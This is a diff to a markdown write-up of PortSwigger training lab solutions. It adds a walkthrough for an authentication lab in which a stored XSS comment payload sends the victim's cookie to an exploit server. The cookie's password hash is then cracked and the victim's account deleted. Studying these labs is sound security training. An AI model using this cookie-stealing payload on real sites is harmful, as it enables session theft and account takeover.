@@ -344,9 +344,35 @@ This lab stores the user's password hash in a cookie. The lab also contains an X
 
 ### Sol :
 
+* With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the stay-logged-in cookie is Base64 encoded.
 
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/13e825e7-1733-40b3-91be-1cfc44987663)
 
+* In the Proxy > HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie
 
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/bc1078be-9831-4cd0-b260-50cfd7d8c932)
+
+* You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
+* Go to the exploit server and make a note of the URL.
+* Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID
+
+      <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+* On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.
+* Decode the cookie in Burp Decoder. The result will be
+  
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/be7be92b-33ad-4945-afeb-91e01b1c4737)
+
+* Copy the hash and paste it into a search engine. This will reveal that the password is
+
+      onceuponatime
+
+* Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/39a8fadc-3eed-475d-a1a7-dda502b64b22)
+
+* Thus, the lab is solved.
+  
 ## Lab 12: Password reset broken logic
 
 This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page
@@ -382,19 +408,3 @@ Login with the `carlos:12345` credentials.
 ![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/80e760e8-4521-4454-b211-cb362ed22e7f)
 
 Thus, the lab is solved.
-
-## Lab 13: Password reset poisoning via middleware
-
-This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.
-
-### Sol :
-
-
-
-
-
-## Lab 14: Password brute-force via password change
-
-This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
-
-### Sol :
